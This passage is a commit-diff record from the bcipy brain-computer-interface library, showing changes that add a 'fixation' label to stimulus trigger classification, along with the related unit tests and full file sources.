'_'\n","add":4,"remove":4,"filename":"\/bcipy\/helpers\/task.py","badparts":["from bcipy.helpers.clock import Clock","from bcipy.task.exceptions import InsufficientDataException"],"goodparts":["from bcipy.helpers.clock import Clock","from bcipy.helpers.stimuli import get_fixation","from bcipy.task.exceptions import InsufficientDataException"]},{"diff":"\n \n \n def target_info(triggers: List[Tuple[str, float]],\n-                target_letter: str = None) -> List[str]:\n+                target_letter: str = None,\n+                is_txt: bool = True) -> List[str]:\n     \"\"\"Targetness for each item in triggers.\n \n     Parameters\n     ----------\n     - triggers : list of (stim, offset)\n     - target_letter : letter the user is attempting to spell\n+    - is_txt : bool indicating whether the triggers are text stimuli\n \n     Returns\n     -------\n     list of ('target' | 'nontarget') for each trigger.\n     \"\"\"\n-    if target_letter:\n-        return [\n-            'target' if trg[0] == target_letter else 'nontarget'\n-            for trg in triggers\n-        ]\n-    return ['nontarget'] * len(triggers)\n+    fixation = get_fixation(is_txt)\n+    labels = {target_letter: 'target', fixation: 'fixation'}\n+    return [labels.get(trg[0], 'nontarget') for trg in triggers]\n \n \n def get_data_for_decision(inquiry_timing,","add":6,"remove":7,"filename":"\/bcipy\/helpers\/task.py","badparts":["                target_letter: str = None) -> List[str]:","---------"," triggers : list of (stim, offset)"," target_letter : letter the user is attempting to spell","------","    if target_letter:","        return [","            'target' if trg[0] == target_letter else 'nontarget'","            for trg in triggers","        ]","    return ['nontarget'] * len(triggers)"],"goodparts":["                target_letter: str = None,","                is_txt: bool = True) -> List[str]:","    - is_txt : bool indicating whether the triggers are text stimuli","    fixation = get_fixation(is_txt)","    labels = {target_letter: 'target', fixation: 'fixation'}","    return [labels.get(trg[0], 'nontarget') for trg in triggers]"]},{"diff":"\n import logging\n import os\n import random\n-\n from string import ascii_uppercase\n from typing import Any, List, Tuple, Union\n \n-from bcipy.helpers.clock import Clock\n-from bcipy.task.exceptions import InsufficientDataException\n-\n import numpy as np\n from psychopy import core, event, visual\n \n+from bcipy.helpers.clock import Clock\n+from bcipy.helpers.stimuli import get_fixation\n+from bcipy.task.exceptions import InsufficientDataException\n+\n log = logging.getLogger(__name__)\n \n SPACE_CHAR = '_'\n","add":4,"remove":4,"filename":"\/bcipy\/helpers\/task.py","badparts":["from bcipy.helpers.clock import Clock","from bcipy.task.exceptions import InsufficientDataException"],"goodparts":["from bcipy.helpers.clock import Clock","from bcipy.helpers.stimuli import get_fixation","from bcipy.task.exceptions import InsufficientDataException"]},{"diff":"\n \n \n def target_info(triggers: List[Tuple[str, float]],\n-                target_letter: str = None) -> List[str]:\n+                target_letter: str = None,\n+                is_txt: bool = True) -> List[str]:\n     \"\"\"Targetness for each item in triggers.\n \n     Parameters\n     ----------\n     - triggers : list of (stim, offset)\n     - target_letter : letter the user is attempting to spell\n+    - is_txt : bool indicating whether the triggers are text stimuli\n \n     Returns\n     -------\n     list of ('target' | 'nontarget') for each trigger.\n     \"\"\"\n-    if target_letter:\n-        return [\n-            'target' if trg[0] == target_letter else 'nontarget'\n-            for trg in triggers\n-        ]\n-    return ['nontarget'] * len(triggers)\n+    fixation = get_fixation(is_txt)\n+    labels = {target_letter: 'target', fixation: 'fixation'}\n+    return [labels.get(trg[0], 'nontarget') for trg in triggers]\n \n \n def get_data_for_decision(inquiry_timing,","add":6,"remove":7,"filename":"\/bcipy\/helpers\/task.py","badparts":["                target_letter: str = None) -> List[str]:","---------"," triggers : list of (stim, offset)"," target_letter : letter the user is attempting to spell","------","    if target_letter:","        return [","            'target' if trg[0] == target_letter else 'nontarget'","            for trg in triggers","        ]","    return ['nontarget'] * len(triggers)"],"goodparts":["                target_letter: str = None,","                is_txt: bool = True) -> List[str]:","    - is_txt : bool indicating whether the triggers are text stimuli","    fixation = get_fixation(is_txt)","    labels = {target_letter: 'target', fixation: 'fixation'}","    return [labels.get(trg[0], 'nontarget') for trg in triggers]"]}],"source":"\nimport logging import os import random from string import ascii_uppercase from typing import Any, List, Tuple, Union from bcipy.helpers.clock import Clock from bcipy.task.exceptions import InsufficientDataException import numpy as np from psychopy import core, event, visual log=logging.getLogger(__name__) SPACE_CHAR='_' BACKSPACE_CHAR='<' def fake_copy_phrase_decision(copy_phrase, target_letter, text_task): \"\"\"Fake Copy Phrase Decision. Parameters ---------- copy_phrase(str): phrase to be copied target_letter(str): the letter supposed to be typed text_task(str): phrase spelled at this time Returns ------- (next_target_letter, text_task, run) tuple \"\"\" if text_task=='*': length_of_spelled_letters=0 else: length_of_spelled_letters=len(text_task) length_of_phrase=len(copy_phrase) if length_of_spelled_letters==0: text_task=copy_phrase[length_of_spelled_letters] else: text_task +=copy_phrase[length_of_spelled_letters] length_of_spelled_letters +=1 if length_of_spelled_letters < length_of_phrase: next_target_letter=copy_phrase[length_of_spelled_letters] run=True else: run=False next_target_letter=None text_task=copy_phrase return next_target_letter, text_task, run def calculate_stimulation_freq(flash_time: float) -> float: \"\"\"Calculate Stimulation Frequency. In an RSVP paradigm, the inquiry itself will produce an SSVEP response to the stimulation. Here we calculate what that frequency should be based on the presentation time. PARAMETERS ---------- :param: flash_time: time in seconds to present RSVP inquiry letters :returns: frequency: stimulation frequency of the inquiry \"\"\" return 1 \/ flash_time def alphabet(parameters=None, include_path=True): \"\"\"Alphabet. Function used to standardize the symbols we use as alphabet. Returns ------- array of letters. \"\"\" if parameters and not parameters['is_txt_stim']: path=parameters['path_to_presentation_images'] stimulus_array=[] for stimulus_filename in sorted(os.listdir(path)): if stimulus_filename.endswith( '.png') and not stimulus_filename.endswith('PLUS.png'): if include_path: img=os.path.join(path, stimulus_filename) else: img=os.path.splitext(stimulus_filename)[0] stimulus_array.append(img) return stimulus_array return list(ascii_uppercase) +[BACKSPACE_CHAR, SPACE_CHAR] def construct_triggers(inquiry_timing: List[List]) -> List[Tuple[str, float]]: \"\"\"Construct triggers from inquiry_timing data. Parameters ---------- -inquiry_timing: list of tuples containing stimulus timing and text Returns ------- list of(stim, offset) tuples, where offset is calculated relative to the first stim time. \"\"\" if inquiry_timing: _, first_stim_time=inquiry_timing[0] return[(stim,((timing) -first_stim_time)) for stim, timing in inquiry_timing] return[] def target_info(triggers: List[Tuple[str, float]], target_letter: str=None) -> List[str]: \"\"\"Targetness for each item in triggers. Parameters ---------- -triggers: list of(stim, offset) -target_letter: letter the user is attempting to spell Returns ------- list of('target' | 'nontarget') for each trigger. \"\"\" if target_letter: return[ 'target' if trg[0]==target_letter else 'nontarget' for trg in triggers ] return['nontarget'] * len(triggers) def get_data_for_decision(inquiry_timing, daq, offset=0.0, prestim=0.0, poststim=0.0): \"\"\"Queries the acquisition client for a slice of data and processes the resulting raw data into a form that can be passed to signal processing and classifiers. Parameters ---------- -inquiry_timing(list): list of tuples containing stimuli timing and labels. We assume the list progresses in -daq(DataAcquisitionClient): bcipy data acquisition client with a get_data method and device_info with fs defined -offset(float): offset present in the system which should be accounted for when creating data for classification. This is determined experimentally. -prestim(float): length of data needed before the first sample to reshape and apply transformations -poststim(float): length of data needed after the last sample in order to reshape and apply transformations Returns ------- (raw_data, triggers) tuple \"\"\" _, first_stim_time=inquiry_timing[0] _, last_stim_time=inquiry_timing[-1] time1=first_stim_time +offset -prestim time2=last_stim_time +offset if time2 < time1: raise InsufficientDataException( f'Invalid data query[{time1}-{time2}] with parameters:' f'[inquiry={inquiry_timing}, offset={offset}, prestim={prestim}, poststim={poststim}]') triggers=[(text,((timing) -first_stim_time)) for text, timing in inquiry_timing] data_limit=round((time2 -time1 +poststim) * daq.device_info.fs) log.debug(f'Need{data_limit} records for processing') raw_data=daq.get_data(start=time1, limit=data_limit) if len(raw_data) < data_limit: message=f'Process Data Error: Not enough data received to process. ' \\ f'Data Limit={data_limit}. Data received={len(raw_data)}' log.error(message) raise InsufficientDataException(message) raw_data=np.array([ np.array([_float_val(col) for col in record.data]) for record in raw_data ], dtype=np.float64).transpose() return raw_data, triggers def _float_val(col: Any) -> float: \"\"\"Convert marker data to float values so we can put them in a typed np.array. The marker column has type float if it has a 0.0 value, and would only have type str for a marker value.\"\"\" if isinstance(col, str): return 1.0 return float(col) def trial_complete_message(win, parameters) -> List[visual.TextStim]: \"\"\"Trial Complete Message. Function return a TextStim Object(see Psychopy) to complete the trial. Parameters ---------- win(object): Psychopy Window Object, should be the same as the one used in the experiment parameters(dict): Dictionary of session parameters Returns ------- array of message_stim(trial complete message to be displayed). \"\"\" message_stim=visual.TextStim( win=win, height=parameters['info_height'], text=parameters['trial_complete_message'], font=parameters['info_font'], pos=(parameters['info_pos_x'], parameters['info_pos_y']), wrapWidth=None, color=parameters['trial_complete_message_color'], colorSpace='rgb', opacity=1, depth=-6.0) return[message_stim] def print_message(window: visual.Window, message: str=\"Initializing...\"): \"\"\"Draws a message on the display window using default config. Parameters ---------- window(object): Psychopy Window Object, should be the same as the one used in the experiment parameters(dict): Dictionary of session parameters Returns ------- TextStim object \"\"\" message_stim=visual.TextStim(win=window, text=message) message_stim.draw() window.flip() return message_stim def get_user_input(window, message, color, first_run=False): \"\"\"Get User Input. Function returns whether or not to stop a trial. If a key of interest is passed(e.g. space), it will act on it. Parameters ---------- window[psychopy task window]: task window. *assumes wait_screen method Returns ------- True\/False: whether or not to stop a trial(based on escape key). \"\"\" if not first_run: pause=False keys=event.getKeys(keyList=['space', 'escape']) if keys: if keys[0]=='space': pause=True if keys[0]=='escape': return False else: pause=True while pause: window.wait_screen(message, color) keys=event.getKeys(keyList=['space', 'escape']) if keys: if keys[0]=='escape': return False pause=False return True def get_key_press( key_list: List[str], clock: Clock, stamp_label: str='bcipy_key_press') -> Union[list, None]: \"\"\"Get Key Press. A method to retrieve keys pressed of interest and get back a timestamp with a custom label Parameters ---------- key_list(List[str]): list of keys to look for being pressed. Ex.['space'] clock(Clock): clock to use for timestamping any key press stamp_label(str): custom label to use for timstamping along with the key itself Returns ------- Key Press Timing(List[stamp_label, timestamp]) \"\"\" response=event.getKeys(keyList=key_list, timeStamped=True) if response: key, stamp=response[0] offset=clock.getTime() -core.getTime() timestamp=stamp +offset return[f'{stamp_label}_{key}', timestamp] return None def pause_calibration(window, display, current_index: int, parameters: dict): \"\"\"Pause calibration. Pauses calibration for a given number of seconds and displays a countdown to the user. PARAMETERS ---------- :param: window: Currently active PsychoPy window :param: display: The current display :param: current_index: number of trials that have already taken place :param: trials_before_break: number of trials before break :param: break_len: length of the break time(in seconds) :param: break_message: message to display to the user during the break :returns: bool: break has taken place \"\"\" trials_before_break=parameters['trials_before_break'] break_len=parameters['break_len'] break_message=parameters['break_message'] if(current_index !=0) and(current_index % trials_before_break)==0: for counter in range(break_len): time=break_len -counter message=f'{break_message}{time}s' display.update_task_state( text=message, color_list=['white']) display.draw_static() window.flip() core.wait(1) return True return False def generate_targets(alp, stim_number): \"\"\"Generate a list of targets for each trial, minimizing duplication.\"\"\" if(stim_number <=len(alp)): return random.sample(alp, stim_number) times, remainder=divmod(stim_number, len(alp)) lists=[random.sample(alp, len(alp)) for _ in range(times)] lists.append(random.sample(alp, remainder)) targets=[target for sublist in lists for target in sublist] return targets ","sourceWithComments":"import logging\nimport os\nimport random\n\nfrom string import ascii_uppercase\nfrom typing import Any, List, Tuple, Union\n\nfrom bcipy.helpers.clock import Clock\nfrom bcipy.task.exceptions import InsufficientDataException\n\nimport numpy as np\nfrom psychopy import core, event, visual\n\nlog = logging.getLogger(__name__)\n\nSPACE_CHAR = '_'\nBACKSPACE_CHAR = '<'\n\n\ndef fake_copy_phrase_decision(copy_phrase, target_letter, text_task):\n    \"\"\"Fake Copy Phrase Decision.\n\n    Parameters\n    ----------\n        copy_phrase(str): phrase to be copied\n        target_letter(str): the letter supposed to be typed\n        text_task(str): phrase spelled at this time\n\n    Returns\n    -------\n        (next_target_letter, text_task, run) tuple\n    \"\"\"\n    if text_task == '*':\n        length_of_spelled_letters = 0\n    else:\n        length_of_spelled_letters = len(text_task)\n\n    length_of_phrase = len(copy_phrase)\n\n    if length_of_spelled_letters == 0:\n        text_task = copy_phrase[length_of_spelled_letters]\n    else:\n        text_task += copy_phrase[length_of_spelled_letters]\n\n    length_of_spelled_letters += 1\n\n    # If there is still text to be spelled, update the text_task\n    # and target letter\n    if length_of_spelled_letters < length_of_phrase:\n        next_target_letter = copy_phrase[length_of_spelled_letters]\n\n        run = True\n\n    # else, end the run\n    else:\n        run = False\n        next_target_letter = None\n        text_task = copy_phrase\n\n    return next_target_letter, text_task, run\n\n\ndef calculate_stimulation_freq(flash_time: float) -> float:\n    \"\"\"Calculate Stimulation Frequency.\n\n    In an RSVP paradigm, the inquiry itself will produce an\n        SSVEP response to the stimulation. Here we calculate\n        what that frequency should be based on the presentation\n        time.\n\n    PARAMETERS\n    ----------\n    :param: flash_time: time in seconds to present RSVP inquiry letters\n    :returns: frequency: stimulation frequency of the inquiry\n    \"\"\"\n\n    # We want to know how many stimuli will present in a second\n    return 1 \/ flash_time\n\n\ndef alphabet(parameters=None, include_path=True):\n    \"\"\"Alphabet.\n\n    Function used to standardize the symbols we use as alphabet.\n\n    Returns\n    -------\n        array of letters.\n    \"\"\"\n    if parameters and not parameters['is_txt_stim']:\n        # construct an array of paths to images\n        path = parameters['path_to_presentation_images']\n        stimulus_array = []\n        for stimulus_filename in sorted(os.listdir(path)):\n            # PLUS.png is reserved for the fixation symbol\n            if stimulus_filename.endswith(\n                    '.png') and not stimulus_filename.endswith('PLUS.png'):\n                if include_path:\n                    img = os.path.join(path, stimulus_filename)\n                else:\n                    img = os.path.splitext(stimulus_filename)[0]\n                stimulus_array.append(img)\n        return stimulus_array\n\n    return list(ascii_uppercase) + [BACKSPACE_CHAR, SPACE_CHAR]\n\n\ndef construct_triggers(inquiry_timing: List[List]) -> List[Tuple[str, float]]:\n    \"\"\"Construct triggers from inquiry_timing data.\n\n    Parameters\n    ----------\n    - inquiry_timing: list of tuples containing stimulus timing and text\n\n    Returns\n    -------\n    list of (stim, offset) tuples, where offset is calculated relative to the\n    first stim time.\n    \"\"\"\n    if inquiry_timing:\n        _, first_stim_time = inquiry_timing[0]\n        return [(stim, ((timing) - first_stim_time))\n                for stim, timing in inquiry_timing]\n    return []\n\n\ndef target_info(triggers: List[Tuple[str, float]],\n                target_letter: str = None) -> List[str]:\n    \"\"\"Targetness for each item in triggers.\n\n    Parameters\n    ----------\n    - triggers : list of (stim, offset)\n    - target_letter : letter the user is attempting to spell\n\n    Returns\n    -------\n    list of ('target' | 'nontarget') for each trigger.\n    \"\"\"\n    if target_letter:\n        return [\n            'target' if trg[0] == target_letter else 'nontarget'\n            for trg in triggers\n        ]\n    return ['nontarget'] * len(triggers)\n\n\ndef get_data_for_decision(inquiry_timing,\n                          daq,\n                          offset=0.0,\n                          prestim=0.0,\n                          poststim=0.0):\n    \"\"\"Queries the acquisition client for a slice of data and processes the\n    resulting raw data into a form that can be passed to signal processing and\n    classifiers.\n\n    Parameters\n    ----------\n    - inquiry_timing(list): list of tuples containing stimuli timing and labels. We assume the list progresses in\n    - daq (DataAcquisitionClient): bcipy data acquisition client with a get_data method and device_info with fs defined\n    - offset (float): offset present in the system which should be accounted for when creating data for classification.\n        This is determined experimentally.\n    - prestim (float): length of data needed before the first sample to reshape and apply transformations\n    - poststim (float): length of data needed after the last sample in order to reshape and apply transformations\n\n    Returns\n    -------\n    (raw_data, triggers) tuple\n    \"\"\"\n    _, first_stim_time = inquiry_timing[0]\n    _, last_stim_time = inquiry_timing[-1]\n\n    # adjust for offsets\n    time1 = first_stim_time + offset - prestim\n    time2 = last_stim_time + offset\n\n    if time2 < time1:\n        raise InsufficientDataException(\n            f'Invalid data query [{time1}-{time2}] with parameters:'\n            f'[inquiry={inquiry_timing}, offset={offset}, prestim={prestim}, poststim={poststim}]')\n\n    # Construct triggers to send off for processing. This should not be zero anymore. it would be for prestim_len = 0\n    triggers = [(text, ((timing) - first_stim_time))\n                for text, timing in inquiry_timing]\n\n    # Define the amount of data required for any processing to occur.\n    data_limit = round((time2 - time1 + poststim) * daq.device_info.fs)\n    log.debug(f'Need {data_limit} records for processing')\n\n    # Query for raw data\n    raw_data = daq.get_data(start=time1, limit=data_limit)\n\n    if len(raw_data) < data_limit:\n        message = f'Process Data Error: Not enough data received to process. ' \\\n            f'Data Limit = {data_limit}. Data received = {len(raw_data)}'\n        log.error(message)\n        raise InsufficientDataException(message)\n\n    # Take only the sensor data from raw data and transpose it\n    raw_data = np.array([\n        np.array([_float_val(col) for col in record.data])\n        for record in raw_data\n    ],\n        dtype=np.float64).transpose()\n\n    return raw_data, triggers\n\n\ndef _float_val(col: Any) -> float:\n    \"\"\"Convert marker data to float values so we can put them in a\n    typed np.array. The marker column has type float if it has a 0.0\n    value, and would only have type str for a marker value.\"\"\"\n    if isinstance(col, str):\n        return 1.0\n    return float(col)\n\n\ndef trial_complete_message(win, parameters) -> List[visual.TextStim]:\n    \"\"\"Trial Complete Message.\n\n    Function return a TextStim Object (see Psychopy) to complete the trial.\n\n    Parameters\n    ----------\n\n        win (object): Psychopy Window Object, should be the same as the one\n            used in the experiment\n        parameters (dict): Dictionary of session parameters\n\n    Returns\n    -------\n        array of message_stim (trial complete message to be displayed).\n    \"\"\"\n    message_stim = visual.TextStim(\n        win=win,\n        height=parameters['info_height'],\n        text=parameters['trial_complete_message'],\n        font=parameters['info_font'],\n        pos=(parameters['info_pos_x'],\n             parameters['info_pos_y']),\n        wrapWidth=None,\n        color=parameters['trial_complete_message_color'],\n        colorSpace='rgb',\n        opacity=1, depth=-6.0)\n    return [message_stim]\n\n\ndef print_message(window: visual.Window, message: str = \"Initializing...\"):\n    \"\"\"Draws a message on the display window using default config.\n\n    Parameters\n    ----------\n        window (object): Psychopy Window Object, should be the same as the one\n            used in the experiment\n        parameters (dict): Dictionary of session parameters\n\n    Returns\n    -------\n        TextStim object\n    \"\"\"\n    message_stim = visual.TextStim(win=window, text=message)\n    message_stim.draw()\n    window.flip()\n    return message_stim\n\n\ndef get_user_input(window, message, color, first_run=False):\n    \"\"\"Get User Input.\n\n    Function returns whether or not to stop a trial. If a key of interest is\n        passed (e.g. space), it will act on it.\n\n    Parameters\n    ----------\n\n        window[psychopy task window]: task window.  *assumes wait_screen method\n\n    Returns\n    -------\n        True\/False: whether or not to stop a trial (based on escape key).\n    \"\"\"\n    if not first_run:\n        pause = False\n        # check user input to make sure we should be going\n        keys = event.getKeys(keyList=['space', 'escape'])\n\n        if keys:\n            # pause?\n            if keys[0] == 'space':\n                pause = True\n\n            # escape?\n            if keys[0] == 'escape':\n                return False\n\n    else:\n        pause = True\n\n    while pause:\n        window.wait_screen(message, color)\n        keys = event.getKeys(keyList=['space', 'escape'])\n\n        if keys:\n            if keys[0] == 'escape':\n                return False\n            pause = False\n\n    return True\n\n\ndef get_key_press(\n        key_list: List[str],\n        clock: Clock,\n        stamp_label: str = 'bcipy_key_press') -> Union[list, None]:\n    \"\"\"Get Key Press.\n\n    A method to retrieve keys pressed of interest and get back a timestamp with\n        a custom label\n\n\n    Parameters\n    ----------\n        key_list(List[str]): list of keys to look for being pressed. Ex. ['space']\n        clock(Clock): clock to use for timestamping any key press\n        stamp_label(str): custom label to use for timstamping along with the key itself\n\n    Returns\n    -------\n        Key Press Timing(List[stamp_label, timestamp])\n    \"\"\"\n    response = event.getKeys(keyList=key_list, timeStamped=True)\n    if response:\n        # The timestamp from the response uses the psychopy.core.monotonicClock\n        # which records the number of seconds since the experiment start (core\n        # was imported).\n        key, stamp = response[0]\n        offset = clock.getTime() - core.getTime()\n        timestamp = stamp + offset\n        return [f'{stamp_label}_{key}', timestamp]\n    return None\n\n\ndef pause_calibration(window, display, current_index: int, parameters: dict):\n    \"\"\"Pause calibration.\n\n    Pauses calibration for a given number of seconds and displays a countdown\n    to the user.\n\n\n    PARAMETERS\n    ----------\n    :param: window: Currently active PsychoPy window\n    :param: display: The current display\n    :param: current_index: number of trials that have already taken place\n    :param: trials_before_break: number of trials before break\n    :param: break_len: length of the break time (in seconds)\n    :param: break_message: message to display to the user during the break\n\n    :returns: bool: break has taken place\n    \"\"\"\n    # Check whether or not to present a break\n    trials_before_break = parameters['trials_before_break']\n    break_len = parameters['break_len']\n    break_message = parameters['break_message']\n\n    if (current_index != 0) and (current_index % trials_before_break) == 0:\n\n        # present break message for break length\n        for counter in range(break_len):\n            time = break_len - counter\n            message = f'{break_message} {time}s'\n            display.update_task_state(\n                text=message,\n                color_list=['white'])\n            display.draw_static()\n            window.flip()\n            core.wait(1)\n        return True\n\n    return False\n\n\ndef generate_targets(alp, stim_number):\n    \"\"\"Generate a list of targets for each trial, minimizing duplication.\"\"\"\n    if (stim_number <= len(alp)):\n        return random.sample(alp, stim_number)\n\n    # minimize duplicates\n    times, remainder = divmod(stim_number, len(alp))\n\n    lists = [random.sample(alp, len(alp)) for _ in range(times)]\n    lists.append(random.sample(alp, remainder))\n\n    # flatten list of lists\n    targets = [target for sublist in lists for target in sublist]\n\n    return targets\n"},"\/bcipy\/helpers\/tests\/test_task.py":{"changes":[{"diff":"\n                     ('X', 1.9859995969745796), ('Y', 2.203130029985914),\n                     ('W', 2.4198898100003134)]\n         expected = [\n-            'nontarget', 'nontarget', 'nontarget', 'target', 'nontarget',\n+            'fixation', 'nontarget', 'nontarget', 'target', 'nontarget',\n             'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget'\n         ]\n         self.assertEqual(expected, target_info(triggers, target_letter='Z'))\n \n         expected = [\n-            'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n+            'fixation', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget'\n         ","add":2,"remove":2,"filename":"\/bcipy\/helpers\/tests\/test_task.py","badparts":["            'nontarget', 'nontarget', 'nontarget', 'target', 'nontarget',","            'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',"],"goodparts":["            'fixation', 'nontarget', 'nontarget', 'target', 'nontarget',","            'fixation', 'nontarget', 'nontarget', 'nontarget', 'nontarget',"]},{"diff":"\n                     ('X', 1.9859995969745796), ('Y', 2.203130029985914),\n                     ('W', 2.4198898100003134)]\n         expected = [\n-            'nontarget', 'nontarget', 'nontarget', 'target', 'nontarget',\n+            'fixation', 'nontarget', 'nontarget', 'target', 'nontarget',\n             'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget'\n         ]\n         self.assertEqual(expected, target_info(triggers, target_letter='Z'))\n \n         expected = [\n-            'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n+            'fixation', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget'\n         ","add":2,"remove":2,"filename":"\/bcipy\/helpers\/tests\/test_task.py","badparts":["            'nontarget', 'nontarget', 'nontarget', 'target', 'nontarget',","            'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',"],"goodparts":["            'fixation', 'nontarget', 'nontarget', 'target', 'nontarget',","            'fixation', 'nontarget', 'nontarget', 'nontarget', 'nontarget',"]}],"source":"\nimport unittest from typing import List from collections import Counter from mockito import unstub, mock, when, verify, verifyStubbedInvocationsAreUsed import numpy as np import psychopy from bcipy.acquisition.client import DataAcquisitionClient from bcipy.acquisition.record import Record from bcipy.task.exceptions import InsufficientDataException from bcipy.helpers.task import( _float_val, alphabet, calculate_stimulation_freq, construct_triggers, generate_targets, get_data_for_decision, get_key_press, target_info ) class TestAlphabet(unittest.TestCase): def test_alphabet_text(self): parameters={} parameters['is_txt_stim']=True alp=alphabet(parameters) self.assertEqual( alp, ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '<', '_']) def test_alphabet_images(self): parameters={} parameters['is_txt_stim']=False parameters['path_to_presentation_images']=('bcipy\/static\/images\/' 'rsvp\/') alp=alphabet(parameters) self.assertNotEqual( alp, ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'V', 'Y', 'Z', '<', '_']) class TestCalculateStimulationFreq(unittest.TestCase): def test_calculate_stimulate_frequency_returns_number_less_one(self): flash_time=5 stimulation_frequency=calculate_stimulation_freq(flash_time) expected=1 \/ flash_time self.assertEqual(stimulation_frequency, expected) def test_calculate_stimulate_frequency_handles_zero(self): flash_time=0 with self.assertRaises(ZeroDivisionError): calculate_stimulation_freq(flash_time) class TestFloatVal(unittest.TestCase): def test_float_val_as_str(self): col='Apple' result=_float_val(col) expected=1.0 self.assertEqual(result, expected) def test_float_val_as_int(self): col=3 result=_float_val(col) expected=3.0 self.assertEqual(result, expected) class TestTargetGeneration(unittest.TestCase): \"\"\"Tests for generation of target inquiries\"\"\" def test_target_number_less_than_alp(self): \"\"\"Test when requested number of targets is less than the length of the alphabet.\"\"\" alp=list(range(10)) targets=generate_targets(alp, 5) self.assertEqual(len(targets), 5) self.assertEqual(len(targets), len(set(targets))) def test_target_greater_than_alp(self): \"\"\"Test behavior when number of targets is greater than the length of the alphabet\"\"\" alp=list(range(5)) targets=generate_targets(alp, 10) self.assertEqual(len(targets), 10) counts=Counter(targets) for item in alp: self.assertEqual(counts[item], 2) def test_remainder(self): \"\"\"Test behavior when number of targets is greater than the length of the alphabet by a value other than a multiple of the alphabet length. \"\"\" alp=list(range(5)) targets=generate_targets(alp, 12) counts=Counter(targets) for item in alp: self.assertGreaterEqual(counts[item], 2) self.assertLessEqual(counts[item], 3) class TestGetKeyPress(unittest.TestCase): \"\"\"Tests for the get key press method\"\"\" def tearDown(self): verifyStubbedInvocationsAreUsed() unstub() def test_get_key_press_appends_stamp_label_defaults(self): \"\"\"Test for the stamp label defaults, ensures the calls occur with the correct inputs to psychopy\"\"\" key_list=['space'] clock=mock() key_response=[[key_list[0], 1000]] when(psychopy.event).getKeys(keyList=key_list, timeStamped=True).thenReturn(key_response) when(clock).getTime().thenReturn(psychopy.core.getTime()) stamp_label='bcipy_key_press' expected=[f'{stamp_label}_{key_response[0][0]}', key_response[0][1]] response=get_key_press(key_list, clock) self.assertEqual(expected[0], response[0]) self.assertAlmostEqual(expected[1], response[1], delta=0.01) def test_get_key_press_clock_adjustment(self): \"\"\"Test for the stamp label defaults, ensures the calls occur with the correct inputs to psychopy\"\"\" key_list=['space'] clock=mock() key_response=[[key_list[0], 1000]] when(psychopy.event).getKeys(keyList=key_list, timeStamped=True).thenReturn(key_response) when(clock).getTime().thenReturn(psychopy.core.getTime() +100) stamp_label='bcipy_key_press' expected=[f'{stamp_label}_{key_response[0][0]}', key_response[0][1]] response=get_key_press(key_list, clock) self.assertEqual(expected[0], response[0]) self.assertAlmostEqual(1100, response[1], delta=0.01) def test_get_key_press_returns_none_if_no_keys_pressed(self): \"\"\"Test for the case not keys are returned, ensures the calls occur with the correct inputs to psychopy\"\"\" key_list=['space'] key_response=None clock=mock() when(psychopy.event).getKeys(keyList=key_list, timeStamped=True).thenReturn(key_response) response=get_key_press(key_list, clock) self.assertEqual(None, response) def test_get_key_press_set_custom_stamp_message(self): \"\"\"Test for a custom stamp label, ensures the calls occur with the correct inputs to psychopy\"\"\" clock=mock() key_list=['space'] key_response=[[key_list[0], 1000]] when(psychopy.event).getKeys(keyList=key_list, timeStamped=True).thenReturn(key_response) when(clock).getTime().thenReturn(psychopy.core.getTime()) stamp_label='custom_label' expected=[f'{stamp_label}_{key_response[0][0]}', key_response[0][1]] response=get_key_press(key_list, clock, stamp_label=stamp_label) self.assertEqual(expected[0], response[0]) self.assertAlmostEqual(expected[1], response[1], delta=0.01) class TestTriggers(unittest.TestCase): \"\"\"Tests related to triggers\"\"\" def test_construct_triggers(self): stim_times=[['+', 7.009946188016329],['<', 7.477798109990545], ['_', 7.69470399999409],['Z', 7.911495972017292], ['U', 8.128477902995655],['S', 8.345279764995212], ['T', 8.562265532993479],['V', 8.779025560012087], ['X', 8.995945784990909],['Y', 9.213076218002243], ['W', 9.429835998016642]] expected=[('+', 0.0),('<', 0.46785192197421566), ('_', 0.6847578119777609),('Z', 0.901549784000963), ('U', 1.1185317149793264),('S', 1.3353335769788828), ('T', 1.5523193449771497),('V', 1.7690793719957583), ('X', 1.9859995969745796),('Y', 2.203130029985914), ('W', 2.4198898100003134)] self.assertEqual(expected, construct_triggers(stim_times)) self.assertEqual([], construct_triggers([])) def test_target_info(self): triggers=[('+', 0.0),('<', 0.46785192197421566), ('_', 0.6847578119777609),('Z', 0.901549784000963), ('U', 1.1185317149793264),('S', 1.3353335769788828), ('T', 1.5523193449771497),('V', 1.7690793719957583), ('X', 1.9859995969745796),('Y', 2.203130029985914), ('W', 2.4198898100003134)] expected=[ 'nontarget', 'nontarget', 'nontarget', 'target', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget' ] self.assertEqual(expected, target_info(triggers, target_letter='Z')) expected=[ 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget' ] self.assertEqual(expected, target_info(triggers)) self.assertEqual([], target_info([])) def mock_get_data_response(samples: int, high: float, low: float, channels: int) -> List[Record]: \"\"\"Mock DataAcquisitionClient Response. The data acquisition client returns a list of records that need to be looped through to get the raw data without other items attached. \"\"\" data=[np.random.uniform(low, high) for _ in range(channels)] record_data=[] for i in range(samples): record_data.append(Record(data, i, None)) return record_data class TestGetDataForDecision(unittest.TestCase): def setUp(self) -> None: self.inquiry_timing=[('A', 1),('B', 2),('C', 3)] self.daq=mock(spec=DataAcquisitionClient) 